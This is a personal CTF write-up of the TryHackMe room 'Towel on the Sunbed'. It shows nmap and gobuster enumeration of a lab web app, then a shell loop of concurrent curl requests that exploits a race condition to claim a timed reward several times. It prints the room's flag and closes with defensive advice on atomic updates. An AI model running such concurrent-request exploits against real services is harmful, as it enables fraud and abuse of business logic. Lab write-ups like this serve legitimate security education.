# Towel-on-the-Sunbed--Hacker-Holiday--Cybersecurity-Learning-Journey-

# TryHackMe — Towel on the Sunbed (Byte Lotus · Hacker Holidays)

> Attack chain: **Business Logic Abuse → Race Condition → Double-Spending → Whale Vault**

---

## 📋 Overview

| Item | Detail |
|------|--------|
| **Platform** | TryHackMe |
| **Room** | Towel on the Sunbed |
| **Series** | Hacker Holidays · The Byte Lotus Hotel |
| **Difficulty** | Medium |
| **Category** | Web |
| **Focus** | Business Logic Abuse / Race Condition |
| **Application** | Ponzi — Wellness Rewards |
| **Port** | TCP 3000 |
| **Flags** | User/Reward Vault |

**Story context:** Ponzi discovered a crypto rewards application running beside the resort's wellness portal. The application allows users to claim **50 PONZI** every 24 hours.

The goal is to reach **150 PONZI** and unlock the Whale Vault.

The intended restriction is one reward per 24 hours.

However, the application contains a **race condition** in the reward-claiming logic, allowing multiple simultaneous requests to process before the server updates the user's claim state.

---

## 🛠️ Skills Practiced

- Network enumeration with Nmap
- Web enumeration with Gobuster
- Express.js application analysis
- JavaScript source-code inspection
- Session-based authentication
- API endpoint discovery
- Business logic analysis
- Race condition exploitation
- Concurrent HTTP requests
- Double-spending / duplicate reward abuse
- Understanding server-side state synchronization
- API-based flag retrieval

---

## 🎯 Objective

The application provides a staking reward:

```text
50 PONZI every 24 hours

The Whale Vault requires:

150 PONZI
```

Under normal conditions:

```text
Claim #1 → 50 PONZI
Wait 24 hours
Claim #2 → 100 PONZI
Wait 24 hours
Claim #3 → 150 PONZI
```

That would require approximately 48 hours after the first claim.

The objective is therefore to identify a flaw that allows the reward to be claimed multiple times without waiting 24 hours.

---

## 🔎 Enumeration

Port Scan

Initial Nmap scan:

```bash
nmap -sC -sV 10.130.190.114
```

Results:
```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
3000/tcp open  http    Node.js Express framework
```

The web application is running on:
```text
http://10.130.190.114:3000

Port 80 is not the target service.
```

An initial request without the port failed:
```bash
curl -i http://10.130.190.114/
```
Result:

curl: (7) Failed to connect to 10.130.190.114 port 80

The correct endpoint is therefore:
```bash
http://10.130.190.114:3000
```
---

## 🌐 Web Enumeration

Set the target:
```bash
IP=10.130.190.114
```

Request the root page:
```bash
curl -i http://$IP:3000/
```

The server responds with a redirect:
```text
HTTP/1.1 302 Found
Location: /auth/login
```

The login page is available at:
```text
/auth/login
```

Request:
```bash
curl -i http://$IP:3000/auth/login
```

The application identifies itself as:

Ponzi Portfolio — Login

The login form submits JSON to:
```text
POST /auth/login
```
The JavaScript confirms the request format:
```text
const data = Object.fromEntries(new FormData(form));

const resp = await fetch(endpoint, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
});
```
---

## 📂 Directory Enumeration

Gobuster initially failed because the wordlist path was incorrect.

Correct command:
```bash
gobuster dir \
  -u http://$IP:3000 \
  -w ~/Downloads/SecLists/Discovery/Web-Content/common.txt \
  -t 30
```

Interesting results:
```text
/css                  (Status: 301)
/dashboard            (Status: 401)
/js                   (Status: 301)
/vault                (Status: 401)
```

The important application paths discovered were:
```text
/auth/login
/auth/register
/dashboard
/vault
/css/
/js/
```
---

## 👤 Account Creation

The application allows users to create an account.

The registration endpoint is:
```text
POST /auth/register
```

I created a test account and authenticated successfully.

Example account used during the lab:
```text
Username: Alfrido88
Password: 97@7@8z8$$
```

Registration page:
```bash
curl -i http://$IP:3000/auth/register
```

The page confirmed:

Username:Whale
Password:988@@zz$$
Create Account

The registration form sends JSON to:
```text
/auth/register
```
---

## 🔐 Authentication

Login request:
```bash
curl -i -c cookies.txt \
  -X POST "http://$IP:3000/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"username":"Afro88","password":"97@7@8z8"}'
```

The server returned:
```text
HTTP/1.1 200 OK
Set-Cookie: connect.sid=...

Response:

{
  "message": "Logged in."
}
```

The application uses an Express session cookie:

connect.sid

The cookie was saved into:

cookies.txt

---

## 📊 Dashboard

Authenticated dashboard:
```bash
curl -i -b cookies.txt \
  http://$IP:3000/dashboard
```

The dashboard revealed the most important information.
```text
Staking Reward
Earn 50 PONZI every 24 hours by claiming your staking reward.
Whale Vault
Reach 150 PONZI to unlock the Whale Vault and claim your exclusive reward.
```

The frontend JavaScript defines:

const WHALE_THRESHOLD = 150;

The vault button is disabled client-side when:

data.balance < WHALE_THRESHOLD

However, the actual /vault endpoint also performs server-side authorization.

---

## 🔍 Dashboard API

The frontend references:
```text
/dashboard/api/me
```

Querying it:
```bash
curl -i -b cookies.txt \
  http://$IP:3000/dashboard/api/me
```
Returned:
```text
{
  "id": 2,
  "username": "Afro88",
  "balance": 0,
  "tier": "Shrimp",
  "whaleThreshold": 150,
  "canClaim": true,
  "secondsUntilClaim": 0,
  "prices": [
    {
      "symbol": "BTC",
      "price_usd": 67432.11
    },
    {
      "symbol": "ETH",
      "price_usd": 3512.88
    },
    {
      "symbol": "PONZI",
      "price_usd": 4.2
    },
    {
      "symbol": "SOL",
      "price_usd": 178.44
    }
  ]
}
```

This exposed several useful fields:

balance
tier
whaleThreshold
canClaim
secondsUntilClaim

The most interesting value was:

secondsUntilClaim

The application clearly tracks a 24-hour reward interval.

---

## 🎁 Testing the Claim Function

The frontend JavaScript revealed the reward endpoint:
```text
fetch('/claim', { method: 'POST' });
```

The first claim:
```bash
curl -i -b cookies.txt \
  -X POST \
  http://$IP:3000/claim
```
Returned:
```text
{
  "message": "Staking reward claimed successfully.",
  "reward": 50,
  "newBalance": 50,
  "tier": "Shrimp",
  "priceSnapshot": 4.2
}

Balance:

50 PONZI
```

Checking the dashboard again:
```bash
curl -s -b cookies.txt \
  http://$IP:3000/dashboard/api/me | jq
```

Returned:
```text
{
  "balance": 50,
  "tier": "Shrimp",
  "canClaim": false,
  "secondsUntilClaim": 86386
}
```

The server correctly blocked a second immediate request:
```bash
curl -i -b cookies.txt \
  -X POST \
  http://$IP:3000/claim
```

Response:
```text
HTTP/1.1 429 Too Many Requests
{
  "error": "Reward already claimed. Please wait before claiming again.",
  "secondsRemaining": 86362
}
```

So simply sending multiple sequential requests does not work.

## 🧠 Business Logic Analysis

At this point the important pieces were:
```text
Reward:             50 PONZI
Claim interval:     24 hours
Whale threshold:    150 PONZI
```

The application appears to enforce:

lastClaim → 24-hour check → update balance → update claim time

The question becomes:

What happens if multiple requests reach the server at nearly the same time?

This is where the story clue becomes important:

"bro really thinks the clock is the only thing checking him"

The room description also hints at:
```text
"Somewhere between your request and the server's clock,
there's a gap wide enough to walk a whale through."
```

These clues point toward a race condition.

---

## ⚔️ Race Condition Testing

I created a fresh account so the reward state started clean.
```bash
curl -s -X POST "http://$IP:3000/auth/register" \
  -H 'Content-Type: application/json' \
  -d '{"username":"Whale88","password":"97@7@8z8"}'
```

Then logged in:
```bash
curl -i -c whale-cookies.txt \
  -X POST "http://$IP:3000/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"username":"Whale88","password":"97@7@8z8"}'
```

Check initial state:
```bash
curl -s -b whale-cookies.txt \
  "http://$IP:3000/dashboard/api/me" | jq
```

Initial balance:
```text
0 PONZI

And:

canClaim: true
secondsUntilClaim: 0
💥 Exploiting the Race Condition
```

Instead of sending requests sequentially, I sent many requests concurrently.
```bash
for i in $(seq 1 20); do
  curl -s -b whale-cookies.txt \
    -X POST "http://$IP:3000/claim" &
done
```
wait

This produced a mixture of successful and rejected requests.

Successful responses included:
```text
{
  "message": "Staking reward claimed successfully.",
  "reward": 50,
  "newBalance": 100,
  "tier": "Dolphin",
  "priceSnapshot": 4.2
}
```

And later:
```text
{
  "message": "Staking reward claimed successfully.",
  "reward": 50,
  "newBalance": 200,
  "tier": "Whale",
  "priceSnapshot": 4.2
}
```

Meanwhile, other requests returned:
```text
{
  "error": "Reward already claimed. Please wait before claiming again.",
  "secondsRemaining": 86400
}
```

The critical result was:
```text
newBalance: 200
tier: Whale
```
---

## 🐋 Why the Race Condition Works

The vulnerability exists because multiple requests can pass the reward eligibility check before the application's state is updated consistently.

Conceptually:

Request A ──→ Check: reward available
Request B ──→ Check: reward available
Request C ──→ Check: reward available
                 │
                 ├── A → +50
                 ├── B → +50
                 └── C → +50

Instead of:

Check → Update → Check → Update → Check → Update

multiple requests overlap:

Check ────────┐
              ├── Update
Check ────────┤
              ├── Update
Check ────────┤
              └── Update

This allows the same reward condition to be satisfied multiple times during a very small timing window.

This is effectively a double-spending / reward duplication business-logic flaw.

---

## 📈 Confirming Whale Status

After the concurrent requests:
```bash
curl -s -b whale-cookies.txt \
  "http://$IP:3000/dashboard/api/me" | jq
```

Returned:
```text
{
  "id": 3,
  "username": "Whale88",
  "balance": 200,
  "tier": "Whale",
  "whaleThreshold": 150,
  "canClaim": false,
  "secondsUntilClaim": 86388,
  "prices": [
    {
      "symbol": "BTC",
      "price_usd": 67432.11
    },
    {
      "symbol": "ETH",
      "price_usd": 3512.88
    },
    {
      "symbol": "PONZI",
      "price_usd": 4.2
    },
    {
      "symbol": "SOL",
      "price_usd": 178.44
    }
  ]
}
```

Important values:
```text
Balance:         200 PONZI
Whale threshold: 150 PONZI
Tier:            Whale
```

💥💥💥The exploit succeeded💥💥💥

---

## 🔒 Testing the Vault Before Exploitation

Before reaching the threshold, the vault endpoint rejected access.
```bash
curl -i -b cookies.txt \
  http://$IP:3000/vault
```
Response:
```text
HTTP/1.1 403 Forbidden
{
  "error": "Access denied. Whale-tier balance required.",
  "currentBalance": 0,
  "required": 150,
  "shortfall": 150
}
```

This confirms that the server performs an actual balance check.

The client-side disabled button alone is not the security boundary.

---

## 🏦 Whale Vault

Once the balance reached:

200 PONZI

the vault became accessible.

Request:
```bash
curl -i -b whale-cookies.txt \
  http://$IP:3000/vault
```

Response:
```text
HTTP/1.1 200 OK
{
  "message": "Welcome to the Whale Vault.",
  "flag": "THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}",
  "balance": 200
}
🚩 Flag
THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}
```
---

## 🏁 Attack Path Summary
[1] Nmap
      │
      └── TCP 3000 → Node.js Express application

[2] Web Enumeration
      │
      ├── /auth/login
      ├── /auth/register
      ├── /dashboard
      └── /vault

[3] Create Account
      │
      └── Authenticate → connect.sid session

[4] Inspect dashboard.js
      │
      ├── POST /claim
      ├── GET /dashboard/api/me
      └── GET /vault

[5] Normal Claim
      │
      └── +50 PONZI
          └── 24-hour restriction

[6] Business Logic Analysis
      │
      └── Identify race-condition opportunity

[7] Concurrent Requests
      │
      └── Multiple /claim requests simultaneously
          ├── +50
          ├── +50
          └── +50
                │
                └── Balance exceeds 150 PONZI

[8] Whale Status
      │
      └── Balance: 200 PONZI
          Tier: Whale

[9] GET /vault
      │
      └── Whale authorization succeeds
            │
            └── FLAG

---

## 📁 Key Endpoints
Endpoint	Method	Purpose
/auth/register	POST	Create account
/auth/login	POST	Authenticate
/auth/logout	POST	Destroy session
/dashboard	GET	Dashboard UI
/dashboard/api/me	GET	Account/balance information
/claim	POST	Claim staking reward
/vault	GET	Whale Vault / flag

---

## 📊 Important Application Logic
Reward
50 PONZI
Cooldown
24 hours
Whale threshold
150 PONZI
Exploited balance
200 PONZI
Final tier
Whale

---

## 🧠 Key Lessons
1. Client-side restrictions are not security controls

The dashboard disables the claim button while the timer is active:

claimBtn.disabled = true;

But this does not prevent an attacker from directly calling:

POST /claim

The server must enforce the rule.

2. Race conditions can break business logic

A rule such as:

Only one reward every 24 hours

must be implemented atomically.

If the application performs:

CHECK
↓
UPDATE

without proper synchronization, concurrent requests may both pass the check.

3. Test state-changing endpoints concurrently

When investigating business logic, don't only test:

Request → Response
Request → Response
Request → Response

Also consider:

Request A ─┐
Request B ─┼──→ Server
Request C ─┘

Concurrency can expose vulnerabilities that sequential testing completely misses.

4. Server-side authorization still matters

The /vault endpoint correctly rejected users below the threshold:

403 Forbidden

After reaching Whale status:

200 OK

This shows that the important vulnerability was not simply bypassing the vault check.

Instead, the vulnerability was in the business logic used to increase the balance.

---

## 🛡️ Defensive Notes

A secure reward system should ensure that the eligibility check and state update happen atomically.

For example, avoid an unsafe pattern like:
```text
if (canClaim(user)) {
    await addReward(user, 50);
    await updateLastClaim(user);
}
```

Multiple requests could enter the condition before the state is updated.

A safer design should use an atomic database operation or transaction so that only one request can successfully consume the reward entitlement.

$$ Possible defensive controls include:

Atomic database updates
Database transactions
Row/document-level locking where appropriate
Idempotency keys for sensitive operations
Server-side cooldown enforcement
Rate limiting
Concurrency testing during development
Audit logging for abnormal reward activity
Server-side authorization for the vault
Never rely on disabled HTML/JavaScript buttons as security controls

---

## 🔬 Vulnerability Classification

Primary:
Business Logic Vulnerability

Specific weakness:
Race Condition / TOCTOU-style state validation

Impact:
Reward duplication / double-spending

Result:
Balance increased from 0 → 200 PONZI

Security boundary bypassed:
24-hour reward restriction

Final privilege:

Whale-tier access

---

## 📚 References
TryHackMe — Towel on the Sunbed
OWASP — Business Logic Vulnerabilities
OWASP — Race Conditions
Node.js / Express documentation
HTTP concurrency and state-management concepts

---

## ✍️ Author

Personal lab notes from completing:

TryHackMe — Towel on the Sunbed

Part of:

Byte Lotus · Hacker Holidays

For educational purposes only. Always test systems only when you have explicit authorization.

---

LinkedIn:[]

X: [https://x.com/charisma1385/status/2084430432792084699]

---

#TryHackMe #TowelOnTheSunbed #ByteLotus #HackerHolidays #CTF #Writeup #WebSecurity #BusinessLogic #BusinessLogicVulnerability #RaceCondition #TOCTOU #DoubleSpending #NodeJS #ExpressJS #JavaScript #API #WebExploitation #EthicalHacking #CyberSecurity #InfoSec #PenetrationTesting #BugBounty #SecurityResearch #LearningInPublic
